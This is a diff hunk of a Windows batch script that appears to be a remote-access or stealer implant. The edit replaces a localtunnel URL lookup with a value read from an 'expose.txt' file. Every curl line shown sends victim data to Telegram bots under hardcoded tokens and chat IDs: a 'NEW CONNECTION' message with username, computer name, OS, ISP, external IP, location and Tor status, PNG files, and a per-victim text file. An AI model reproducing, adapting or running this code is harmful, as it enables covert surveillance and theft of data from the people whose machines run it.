@@ -60,17 +60,13 @@ for /f "tokens=*" %%A in (
 set "ExtIPTor=N/A"
 )
 
-for /f "tokens=2 delims= " %%a in ('type %temp%\localtunnel.txt^|find "URI: "') do (
-  set URI=%%a
-)
-
-if exist "%temp%\localtunnel.txt" (
- for /f "tokens=2 delims= " %%a in ('type %temp%\localtunnel.txt^|find "URI: "') do (set URI=%%a) && set "localtunnel=https://%URI%.loca.lt"
+if exist "%temp%\expose.txt" (
+    for /f "delims=" %%x in ('type %temp%\expose.txt') do set "Expose=%%x" 
 ) else (
-   set "localtunnel=N/A"
+   set "Expose=N/A"
 )
 
-"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %localtunnel%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
+"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot5491026940:AAE3_nuWEDnViLI_kJEchTNQgHSpxqSlV3k/sendDocument?chat_id=-1001754616308 -k --insecure
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure
 
